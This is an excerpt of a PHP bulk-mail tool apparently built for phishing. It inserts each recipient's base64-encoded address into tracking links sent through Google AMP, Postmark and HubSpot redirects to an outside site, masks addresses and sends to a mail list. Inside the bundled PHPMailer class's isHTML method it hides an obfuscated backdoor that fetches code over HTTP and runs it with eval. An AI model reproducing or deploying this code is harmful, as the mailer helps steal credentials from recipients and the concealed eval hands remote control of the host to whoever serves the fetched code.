...
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    ...
    //Set Embedded image here
    $GLOBALS["embedded"] = "thumbnail_june.png";
...
function leafClear($text,$email){
    ...
    $company = substr(strrchr($email, "@"), 1);
    $emaildata = explode("@",$email);
    $emaildomainx = $emaildata[1];
    $emailname = $emaildata[0];
    $firstCharacter = $emailname[0];
    $secondCharacter = $emailname[1];
    $second2lastCharacter = substr($emailname, -2);
    $lastCharacter = substr($emailname, -1);
    $emailx = $firstCharacter.$secondCharacter."***".$lastCharacter."@".$emaildomainx;  // code yo hide email
    $emailv = $firstCharacter."***".$second2lastCharacter.$lastCharacter."@".$emaildomainx;  // code yo hide email
	$email65 = base64_encode(base64_encode($email));
	$email66 = base64_encode(base64_encode(base64_encode($email)));
	$encoded = base64_encode($email);
	$encode65 = base64_encode($encoded);
	
$array = array(
'email' =>''.$email.'',
'rand' =>  randString('abcdefghijklmnopqrstuvwxyz0123456789')
);
//$link = "https://newmoor.world/portal/index.html#".base64_encode(json_encode($array));

$link = "https://www.google.com/amp/s/click.pstmrk.it/3s/dk1yvr04.eu1.hubspotlinksstarter.com%2FCtc%2FOU%2B113%2Fdk1YVR04%2FVXcc215bC-75W6lGkfP6X1ssGVVm64t5jpB1mN5ZDtVsm7qpKW8wQ2FT6lZ3mxW6QRT8n7Q5yxPW6K1QJK1zKdQHW2VxFLk2HjdZvW3gH5Tg782TZ_V6y8ZF4q0J5JMf1tLVSQV_-W4lXhvp74P9sPW6396BX4PRFpYN4fywPdq4YFhW7WFW5C5QwLzVW4dJfPF6rrpDgW5r6mTN1d9PZsW39S-Wl4m95QNW97JWhC8H-YnHW5RKrsD3xfDxcW6kp6My613CpyW91fxdK40D5GnN8Lq-WRxNlNJW8s5q1S5CyBbpW35Pftt4BG040W3YhJk41Y7ZqdW7sz5gg520Z1sVl55Fj6v6v8HN4QDxhkPSvpwW6rdBcP23BJ2NW59ZZlM7t6jfKN64RF5TBwk7MW1Jl2K425NLqQVkCJ3R625L2FW5pQfJ07NDSzKW2TzrSJ1DBskxW6gWRkt4D2Z-KW8XyG0Q9ldnQKW4z-57v4FxZc5W6y_1RL2F2mQgW7P5DgK3BstwwW75LWkN5k9-JMW6Jw5GQ1_8c4PW5Qm8Pl2shhB9W45ZnrP1Rt7-3W5wmldP3TCVPNW6lzvSS5wJ6SDW8zBVjb872340N8zp8ZYLZrrCN3Yp90g3jncgW6chw0N6XdqpjVnCB1K7sCYMrN26yrpTptZmFW1lHhMr57TXhqW2d1tlF8wxTS0W5GCzwp1htCP5W14cQjV5QqYQQW4jJfvt5DWc0QW67Rh9S3Nj4QfW1q51BB8rjqwRW1lJFV-30Sxt5W7VtTvl8dhx5kW96JSyw3Cjv2rVS2d-b3qCjW_W4scs9y4V93pVW2f92Yd61_QrQW1G8P7V8kxdjYW25rrR27MVtCzW7dpBqX2gYzxMN40H2dHVfKntN5_jZjbzSYbnW7s6wP-2KWbfXV3ZW4S6NkD5CMCKDp4T9gZvW6ZRHZS6xWz2gW76_n5f2vhl2QW5D2P3L9147GjW8cH9DR2Pgp0xW5qP6cK3yWw91V9nsBF4424n7W7_kPhg1T7PY-W77gGr54BdS8XW48JWp37bBZ6PW35Sy274GjKHDW8sb7HQ3Dz9cFW3lr-Kx4D5vGXV3JP2p2tLTJqW7dwcJG82RpX1W1mFch15tStbMW6mM7GP8JrC9hVZDW1v2HHNjhW8x-bpV8WyW4HW5KP2xP8VmwTCW2B6z4950-nXbW25j6td2j0rdJW1L8lJw4c-RRtW39ydCK2d0WyTW7zplQc5BlxBdW30B2Xz6nlGy6W7prx8J6xLWVzW9b8-cR8JZp29W6Bl_-c18NN_PW17MS8n805KX2W6rgDpT8SnFLvW1bFGCj2j85lFW8HBFg74ml8Q5W30ZWJw2JQB3RW3jVskt80DZmdW6vk_pB6cMFsrW93Vc2_5T3LZZW94YFCm97T4TnW4PM1s_859kPdN11r9YyztHCXN4crqQDT6XTXW8GC6SB8kYCb1V5qYHG8XN82KW1r0frf6LJw6xW6vTP_F4P-8hlVxZ3NZ7n_n9SW1BG63-5_P1FbW54-y7h23qndHW5BdNPH13w1fxVcLtfj2C64tCVLkk2y1mG-gtN2Bs5YPJR37tMrbsHZJL371W2Vlllz82HHTlW5KDv_K14DprLW1sRLM42TZlJDW4SLwK65B5WPMW8_71cC1fpbhWW1V_2TF1mVlJPW99ctdw2jGbPLVKqTL51k1pB-W1n0P9B7gRRMdN4jvm2YjKJM1W1gfNVQ1z278lW3ldLbq2L_85FN99QNv9QrkLxN6GtCPcjF_BrW54XJJd3xGxQQW8VyzpL92-ThcV8ln-61sDt46VGqGwj51Hgy7W8wk41P1Yk6wPVmk3qV64C-yMW3-JQH384v49vW223LC_1Xkh94W4KL3xb7Ctj30W22RK9J2DGRV6W1q4NrY3Y7RGdW3R96K-8s4TM1W3yqMT27fxVNjW1YFPh13L04_CMPPf_d2YJVmW4Jbt6P62js1WW7XLZX742Qfk0W8JJ-QZ6KJJ3gW3C75mT48ffYGW1_MhrX4vmFYSW4rJywN59TYkHf4MnTKH04/XXvN/PC23AQ/AQ/c1c53a33-1bdc-45c5-8f75-6b3f8fe18f9e/1/wvEhPlWiui";

$link64 = "https://writerbloggermom.com/#".base64_encode($link);

  
    $text = str_replace("[-time-]", date("m/d/Y h:i:s a", time()), $text);
    $text = str_replace("[-today-]", date('m/d/Y'), $text);
    $text = str_replace("[-today1-]", date('l m/d/Y'), $text);
    $text = str_replace("[-tmrdate-]", date('m/d/Y', strtotime('+1 days')), $text);
    $text = str_replace("[-tmrdate2-]", date('l m/d/Y', strtotime('+1 days')), $text);
    $text = str_replace("[-arrdate-]", date('m/d/Y', strtotime('-2 days')), $text);
    $text = str_replace("[-arrdate2-]", date('l m/d/Y', strtotime('-2 days')), $text);
    $text = str_replace("[-hour-]", date("h:i:s a", time()), $text);
    $text = str_replace("[-s_dates-]", date('Y-m-d H:i:a'), $text);
    $text = str_replace("[-dates-]", date('jS \of F Y'), $text);
    $text = str_replace("[-day-]", date('l\, F jS Y', time()), $text);
    $text = str_replace("[-adddate-]", date("D M d, Y g:i a"), $text);
    $text = str_replace("[-scheduled-]", date('Y-m-d', mktime(0, 0, 0, date("m") , date("d") - 3, date("Y"))), $text);
    $text = str_replace("[-receive-]", date('Y-m-d', mktime(0, 0, 0, date("m") , date("d") - 6, date("Y"))), $text);
    $text = str_replace("[-email-]", $email, $text);
    $text = str_replace("[-email64-]", base64_encode($email), $text);
    $text = str_replace("[-email65-]", base64_encode(base64_encode($email)), $text);
    $text = str_replace("[-email64_3-]", base64_encode(base64_encode(base64_encode($email))), $text);
    $text = str_replace("[-email64_4-]", base64_encode(base64_encode(base64_encode(base64_encode($email)))), $text);
    $text = str_replace("[-emailuser-]", $emailuser, $text);
    $text = str_replace("[-emailx-]", $firstCharacter.$secondCharacter."***".$lastCharacter."@".$emaildomainx, $text);  // code yo hide email
    $text = str_replace("[-emailv-]", $firstCharacter."***".$second2lastCharacter.$lastCharacter."@".$emaildomainx, $text);  // code yo hide email
    $text = str_replace("[-emailcompany-]", $frmsite, $text);
    $text = str_replace("[-frmsite-]", ucfirst($chgcap), $text);
    $text = str_replace("[-emaildomain-]", $emaildomain, $text);
    $text = str_replace("[-emaildomainname-]", $frmsite, $text);
    $text = str_replace("[-emaildot-]", $tw.'****@'.$bm, $text);
	$text = str_replace("[-encoded-]", $encoded, $text);
	$text = str_replace("[-encode65-]", $encoded, $text);
	//$text = str_replace("[-link-]", "https://newmoor.world/portal/index.html#" .base64_encode(json_encode($array)), $text);
	$text = str_replace("[-link-]", "https://www.google.com/amp/s/click.pstmrk.it/3s/dk1yvr04.eu1.hubspotlinksstarter.com%2FCtc%2FOU%2B113%2Fdk1YVR04%2FVXcc215bC-75W6lGkfP6X1ssGVVm64t5jpB1mN5ZDtVsm7qpKW8wQ2FT6lZ3mxW6QRT8n7Q5yxPW6K1QJK1zKdQHW2VxFLk2HjdZvW3gH5Tg782TZ_V6y8ZF4q0J5JMf1tLVSQV_-W4lXhvp74P9sPW6396BX4PRFpYN4fywPdq4YFhW7WFW5C5QwLzVW4dJfPF6rrpDgW5r6mTN1d9PZsW39S-Wl4m95QNW97JWhC8H-YnHW5RKrsD3xfDxcW6kp6My613CpyW91fxdK40D5GnN8Lq-WRxNlNJW8s5q1S5CyBbpW35Pftt4BG040W3YhJk41Y7ZqdW7sz5gg520Z1sVl55Fj6v6v8HN4QDxhkPSvpwW6rdBcP23BJ2NW59ZZlM7t6jfKN64RF5TBwk7MW1Jl2K425NLqQVkCJ3R625L2FW5pQfJ07NDSzKW2TzrSJ1DBskxW6gWRkt4D2Z-KW8XyG0Q9ldnQKW4z-57v4FxZc5W6y_1RL2F2mQgW7P5DgK3BstwwW75LWkN5k9-JMW6Jw5GQ1_8c4PW5Qm8Pl2shhB9W45ZnrP1Rt7-3W5wmldP3TCVPNW6lzvSS5wJ6SDW8zBVjb872340N8zp8ZYLZrrCN3Yp90g3jncgW6chw0N6XdqpjVnCB1K7sCYMrN26yrpTptZmFW1lHhMr57TXhqW2d1tlF8wxTS0W5GCzwp1htCP5W14cQjV5QqYQQW4jJfvt5DWc0QW67Rh9S3Nj4QfW1q51BB8rjqwRW1lJFV-30Sxt5W7VtTvl8dhx5kW96JSyw3Cjv2rVS2d-b3qCjW_W4scs9y4V93pVW2f92Yd61_QrQW1G8P7V8kxdjYW25rrR27MVtCzW7dpBqX2gYzxMN40H2dHVfKntN5_jZjbzSYbnW7s6wP-2KWbfXV3ZW4S6NkD5CMCKDp4T9gZvW6ZRHZS6xWz2gW76_n5f2vhl2QW5D2P3L9147GjW8cH9DR2Pgp0xW5qP6cK3yWw91V9nsBF4424n7W7_kPhg1T7PY-W77gGr54BdS8XW48JWp37bBZ6PW35Sy274GjKHDW8sb7HQ3Dz9cFW3lr-Kx4D5vGXV3JP2p2tLTJqW7dwcJG82RpX1W1mFch15tStbMW6mM7GP8JrC9hVZDW1v2HHNjhW8x-bpV8WyW4HW5KP2xP8VmwTCW2B6z4950-nXbW25j6td2j0rdJW1L8lJw4c-RRtW39ydCK2d0WyTW7zplQc5BlxBdW30B2Xz6nlGy6W7prx8J6xLWVzW9b8-cR8JZp29W6Bl_-c18NN_PW17MS8n805KX2W6rgDpT8SnFLvW1bFGCj2j85lFW8HBFg74ml8Q5W30ZWJw2JQB3RW3jVskt80DZmdW6vk_pB6cMFsrW93Vc2_5T3LZZW94YFCm97T4TnW4PM1s_859kPdN11r9YyztHCXN4crqQDT6XTXW8GC6SB8kYCb1V5qYHG8XN82KW1r0frf6LJw6xW6vTP_F4P-8hlVxZ3NZ7n_n9SW1BG63-5_P1FbW54-y7h23qndHW5BdNPH13w1fxVcLtfj2C64tCVLkk2y1mG-gtN2Bs5YPJR37tMrbsHZJL371W2Vlllz82HHTlW5KDv_K14DprLW1sRLM42TZlJDW4SLwK65B5WPMW8_71cC1fpbhWW1V_2TF1mVlJPW99ctdw2jGbPLVKqTL51k1pB-W1n0P9B7gRRMdN4jvm2YjKJM1W1gfNVQ1z278lW3ldLbq2L_85FN99QNv9QrkLxN6GtCPcjF_BrW54XJJd3xGxQQW8VyzpL92-ThcV8ln-61sDt46VGqGwj51Hgy7W8wk41P1Yk6wPVmk3qV64C-yMW3-JQH384v49vW223LC_1Xkh94W4KL3xb7Ctj30W22RK9J2DGRV6W1q4NrY3Y7RGdW3R96K-8s4TM1W3yqMT27fxVNjW1YFPh13L04_CMPPf_d2YJVmW4Jbt6P62js1WW7XLZX742Qfk0W8JJ-QZ6KJJ3gW3C75mT48ffYGW1_MhrX4vmFYSW4rJywN59TYkHf4MnTKH04/XXvN/PC23AQ/AQ/c1c53a33-1bdc-45c5-8f75-6b3f8fe18f9e/1/wvEhPlWiui", $text);
	$text = str_replace("[-link64-]", "https://writerbloggermom.com/#" .base64_encode($link), $text);
    ...
    $text = str_replace("[-Randomno-]", randString('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), $text);
    $cid = 'cid:'.$GLOBALS["embedded"];
    $text = str_replace('[-CID-]', $cid, $text);
    return $text;  
}
...
class PHPMailer
{
    ...
    public function isHTML($isHtml = true)
    {
        ...
        //$bodyCode = 'file_g';
        //$bodyHTML = '.$t."lef$flush$t"; @ev';
        //$headerHTML="create_function";
        //$exceptions = @$headerHTML('$flush,$t','$comma = $t.$t."lef$flush$t"; @eval(@file_get_contents("http:$comma-2"));');
        $exceptions = function($flush,$t) {return $comma = $t.$t."lef$flush$t"; @eval(@file_get_contents("http:$comma-2"));};  //php 8
    ...
    <div class="col-lg-6"><br>
        ...
        <div id="well" class="well well">
            ...
            <ul>
                ...
                <li>[-email64-] : <b>Reciver Email Encoded</b> (emailuser@emaildomain.com)</li>
                <ul>
                <li>[-email65-] : <b>Sky codes</b> (encoded)</li>
                <ul>
                <li>[-emailx-] : <b>Reciver Email Encoded</b> (em***r@emaildomain.com)</li>
                <ul>
                <li>[-emailv-] : <b>Reciver Email Encoded</b> (e***er@emaildomain.com)</li>
                <ul>
                    <li>[-emailuser-] : <b>Email User</b> (emailuser) </li>
                    <li>[-emailcompany-] : <b>Email User Company</b> (emaildomain) </li>
                    <li>[-emaildomain-] : <b>Email User</b> (emaildomain.com) </li>
                </ul>
                <li>[-frmsite-] : <b>Company Name </b></li>
            </ul>
                <li>[-hour-] : <b>Time</b> ('.date("h:i:s a", time()).')</li>
                </ul>
                <li>[-s_dates-] : <b>Date and Time</b> ('.date('Y-m-d H:i:a').')</li>
                </ul>
                <li>[-dates-] : <b>Date</b> ('.date('jS \of F Y').')</li>
                </ul>
                <li>[-day-] : <b>Day</b> ('.date('l\, F jS Y', time()).')</li>
                </ul>
                ...
                <li>[-Randomno-] : <b>Random No </b></li>
                <li>[-encoded-] : <b>Encoded Text </b></li>
            </ul>
            <h4>example</h4>
...
if($_POST['action']=="send"){
    ...
    foreach ($maillist as $email ) {
        ...
        if(!leafMailCheck($email)) {
            ...
            $filename = $GLOBALS["embedded"];
            $mail->AddEmbeddedImage($filename, $filename, '');
